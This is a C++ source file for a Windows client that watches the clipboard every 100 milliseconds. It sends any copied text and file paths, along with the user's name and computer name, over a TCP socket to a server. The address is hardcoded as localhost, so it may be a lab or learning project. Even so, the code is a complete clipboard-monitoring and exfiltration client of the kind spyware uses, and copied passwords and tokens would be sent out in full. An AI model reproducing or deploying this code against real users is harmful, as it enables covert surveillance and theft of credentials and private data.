#include "common.h"
#include <iostream>
#include <thread>
#include <string>
#include <Lmcons.h>
#include <windows.h>

// Function to convert UTF-16 to UTF-8 using WinAPI
std::string WideToUtf8(const std::wstring& wide) {
    if (wide.empty()) return std::string();
    
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), (int)wide.size(), NULL, 0, NULL, NULL);
    std::string utf8(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), (int)wide.size(), &utf8[0], size_needed, NULL, NULL);
    return utf8;
}

// Function to get file information from clipboard
std::string ProcessFileClipboard() {
    std::string result;
    HDROP hDrop = (HDROP)GetClipboardData(CF_HDROP);
    if (hDrop != NULL) {
        UINT fileCount = DragQueryFile(hDrop, 0xFFFFFFFF, NULL, 0);
        
        for (UINT i = 0; i < fileCount; i++) {
            TCHAR szFile[MAX_PATH];
            if (DragQueryFile(hDrop, i, szFile, MAX_PATH)) {
                std::wstring widePath(szFile);
                std::string utf8Path = WideToUtf8(widePath);
                result += "File: " + utf8Path + "\n";
                
                // Get file extension
                size_t dotPos = widePath.find_last_of(L".");
                if (dotPos != std::wstring::npos) {
                    std::wstring wideExt = widePath.substr(dotPos + 1);
                    std::string utf8Ext = WideToUtf8(wideExt);
                    result += "Type: " + utf8Ext + "\n";
                }
            }
        }
    }
    return result;
}

// Function to get text from clipboard
std::string ProcessTextClipboard() {
    std::string result;
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != NULL) {
        wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
        if (pszText != NULL) {
            std::wstring wideText(pszText);
            std::string utf8Text = WideToUtf8(wideText);
            result = "Text content: " + utf8Text;
            GlobalUnlock(hData);
        }
    }
    return result;
}

void MonitorClipboard(SOCKET sock) {
    // Previous clipboard sequence number
    DWORD lastSequence = GetClipboardSequenceNumber();
    
    while (true) {
        // Check if clipboard content has changed
        DWORD currentSequence = GetClipboardSequenceNumber();
        
        if (currentSequence != lastSequence) {
            lastSequence = currentSequence;
            
            if (OpenClipboard(NULL)) {
                Message msg = {};
                msg.type = MessageType::REGULAR;
                std::string clipboardContent;
                
                // Check for files
                if (IsClipboardFormatAvailable(CF_HDROP)) {
                    clipboardContent = "Files detected in clipboard:\n" + ProcessFileClipboard();
                }
                // Check for text
                else if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
                    clipboardContent = "Text detected in clipboard:\n" + ProcessTextClipboard();
                }
                
                if (!clipboardContent.empty()) {
                    strncpy_s(msg.data, clipboardContent.c_str(), BUFFER_SIZE - 1);
                    send(sock, (char*)&msg, sizeof(Message), 0);
                }
                
                CloseClipboard();
            }
        }
        
        Sleep(100); // Check every 100ms
    }
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket" << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEFAULT_PORT);
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to server" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // Get username and hostname
    char username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;
    GetUserNameA(username, &usernameLen);

    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD hostnameLen = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(hostname, &hostnameLen);

    // Send initialization message
    Message initMsg = {};
    initMsg.type = MessageType::INIT;
    strncpy_s(initMsg.clientInfo.username, username, MAX_NAME_LENGTH - 1);
    strncpy_s(initMsg.clientInfo.hostname, hostname, MAX_NAME_LENGTH - 1);
    send(clientSocket, (char*)&initMsg, sizeof(Message), 0);

    std::cout << "Connected to server. Monitoring clipboard..." << std::endl;

    // Start clipboard monitoring in a separate thread
    std::thread clipboardThread(MonitorClipboard, clientSocket);
    clipboardThread.join();

    closesocket(clientSocket);
    WSACleanup();
    return 0;
} 